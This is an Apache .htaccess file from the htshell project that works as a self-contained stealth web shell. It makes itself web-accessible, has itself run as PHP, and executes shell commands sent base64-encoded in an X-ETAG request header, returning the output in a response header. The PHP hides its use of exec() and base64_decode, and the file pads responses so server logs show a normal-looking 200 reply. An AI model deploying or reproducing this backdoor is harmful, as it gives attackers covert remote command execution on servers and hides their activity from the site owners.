# Self contained .htaccess stealth web shell - Part of the htshell project
# Written by Wireghoul - http://www.justanotherhacker.com
    
# Override default deny rule to make .htaccess file accessible over web
<Files ~ "^\.htaccess">
# Uncomment the line below for Apache2.4 and newer
# Require all granted
    Order allow,deny
    Allow from all
</Files>

# Make .htaccess file be interpreted as php file. This occur after apache has interpreted 
# the apache directoves from the .htaccess file
AddType application/x-httpd-php .htaccess

# Enable output buffering so we can fudge content length in logs (see the ob_* calls)
php_value output_buffering 1

# Rewrite supposed url to the .htaccess file if X-ETAG request header is set
RewriteEngine on
RewriteCond %{HTTP:X-ETAG} !^$
RewriteRule .* .htaccess [L]
RewriteCond %{HTTP:X-ETAG} ^$
RewriteRule .htaccess - [F]

# Set $e to exec(), discard 2 byte padding on base64 encoding (breaks automated decoding), payload in X-ETAG header
# Then make sure the log contains a 200 ok response with response size of 9326 (should match the file you are impersonating or a code in a 404 response)
# SHELL <?php ob_clean(); $b= "base64"."_decode"; $e = str_replace('y','e','yxyc'); $e($b(substr($_SERVER['HTTP_X_ETAG'],2))." 2>&1", $o); header("X-ETAG: AA".base64_encode(implode("\r\n ", $o))); print str_repeat(" ", 9326); ob_flush(); exit(); ?>
